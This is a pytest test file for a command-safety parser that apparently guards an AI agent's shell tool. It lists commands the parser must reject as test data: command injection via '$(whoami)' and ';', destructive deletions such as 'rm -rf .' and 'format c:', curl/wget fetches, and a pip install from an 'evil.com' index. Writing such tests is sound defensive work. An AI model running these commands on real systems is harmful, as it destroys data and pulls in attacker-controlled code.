import shutil

import pytest

from core.safety import SafetyError, parse_command


def code(cmd, root, **kw):
    with pytest.raises(SafetyError) as e:
        parse_command(cmd, root, **kw)
    return e.value.code


@pytest.mark.parametrize("cmd", ["python main.py", "pytest -q", "python -m pytest -q tests", "python format_data.py",
                                 "python -c \"print('format')\""])
def test_legit_commands_pass(workspace, cmd):
    if not shutil.which(cmd.split()[0]):
        pytest.skip("executable not on PATH")
    assert parse_command(cmd, workspace).name in ("python", "pytest")


def test_npm_run_build_passes(workspace):
    if not shutil.which("npm"):
        pytest.skip("npm not installed")
    assert parse_command("npm run build", workspace).name == "npm"


@pytest.mark.parametrize("cmd", ["python a.py | more", "python a.py && del x", "python a.py ; rm x", "python a.py > out.txt",
                                 "python a.py < in.txt", "python `whoami`", "python $(whoami)", "python a.py & calc", "python a.py\nrm x"])
def test_shell_operators_rejected(workspace, cmd):
    assert code(cmd, workspace) == "SHELL_OPERATOR"


@pytest.mark.parametrize("cmd", ["rm -rf .", "del /s /q *", "rmdir x", "Remove-Item x", "format c:", "curl http://x", "wget http://x",
                                 "powershell -c ls", "cmd /c dir", "sudo ls", "./evil.exe", "C:\\x\\python.exe a.py"])
def test_non_allowlisted_rejected(workspace, cmd):
    assert code(cmd, workspace) == "NOT_ALLOWED"


def test_installs_only_via_install_tool(workspace):
    assert code("pip install requests", workspace) == "USE_INSTALL_DEPENDENCY"
    assert code("python -m pip install requests", workspace) == "USE_INSTALL_DEPENDENCY"
    assert parse_command("pip install requests", workspace, allow_install=True).installs
    assert parse_command("python -m pip install requests", workspace, allow_install=True).installs
    assert code("python main.py", workspace, allow_install=True) == "NOT_AN_INSTALL"


@pytest.mark.parametrize("cmd", ["pip install --index-url http://evil.com/simple requests", "pip install -i http://x/s requests",
                                 "pip install --extra-index-url https://x requests", "pip install git+https://x/y.git",
                                 "pip install --user requests", "pip install --target . requests"])
def test_bad_install_flags(workspace, cmd):
    assert code(cmd, workspace, allow_install=True) == "BAD_INSTALL"


def test_requirements_outside_root_rejected(workspace):
    assert code("pip install -r ../other/requirements.txt", workspace, allow_install=True) == "OUTSIDE_ROOT"
    (workspace / "requirements.txt").write_text("x\n")
    assert parse_command("pip install -r requirements.txt", workspace, allow_install=True).installs
